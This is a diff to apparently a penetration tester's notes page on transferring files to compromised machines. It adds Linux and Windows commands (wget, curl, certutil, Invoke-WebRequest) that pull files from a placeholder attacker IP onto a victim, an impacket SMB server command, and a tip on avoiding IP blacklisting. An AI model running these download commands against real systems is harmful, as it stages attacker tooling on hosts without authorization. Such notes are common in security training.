@@ -3,7 +3,6 @@ For the sake of example, everything labeled as a "task" can be considered the da
 > [!danger] Detection Risk
 > Don't burn important host IPs onto a blacklist trying to download autopwn.exe or something stupid. Be cognizant of your situation, and act accordingly. Run stuff by more senior teammates if you don't know for sure. 
 
-
 [[#File Transfers]] are TO a target machine, [[#Exfiltration]] is FROM a target machine. 
 
 # File Transfers
@@ -18,9 +17,23 @@ On the victim machine:
 ```bash
 (Linux)
 wget http://<attackerIP>:<portno>/FileToTransfer
+curl -o <outfile> http://<attackerIP>:<portno>/FileToTransfer
+```
 
+
+```powershell
 (Windows)
-curl http://<attackerIP>:<portno>/FileToTransfer -O FileToTransfer
+# Curl
+curl http://<attackerIP>:<portno>/FileToTransfer -o <outfile>
+
+# Wget
+wget http://<attackerIP>:<portno>/FileToTransfer
+
+# Certutil
+certutil.exe -urlcache -f http://<attackerIP>/FileToTransfer <outfile>
+
+# Powershell
+Invoke-WebRequest -Uri "http://<attackerIP>:<portno>/FileToTransfer" -OutFile <outfile>
 ```
 
 ## SMB
@@ -28,6 +41,7 @@ curl http://<attackerIP>:<portno>/FileToTransfer -O FileToTransfer
 impacket-smbserver -smb2support -username <user to auth> -password <password to auth> <share name> <share location> # Open an SMB share serving <share location> as <share name>
 ```
 
+Here you can use File Explorer or [[net]] on Windows to map the drive and [[SMBClient]] on Linux. 
 ## Client Side
 
 # Exfiltration
